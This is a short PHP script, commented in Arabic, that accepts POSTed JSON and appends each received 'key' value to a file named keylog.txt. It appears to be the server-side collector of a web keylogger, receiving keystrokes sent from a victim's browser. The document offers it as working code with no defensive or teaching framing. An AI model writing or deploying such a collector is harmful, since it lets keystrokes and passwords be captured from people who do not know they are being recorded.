<?php
$data = json_decode(file_get_contents('php://input'), true);
$key = $data['key'];
$log_file_path = 'keylog.txt';  // تأكد من أن لديك أذونات الكتابة في هذا المسار
file_put_contents($log_file_path, "Key pressed: " . $key . "\n", FILE_APPEND);
echo json_encode(['status' => 'success']);
?>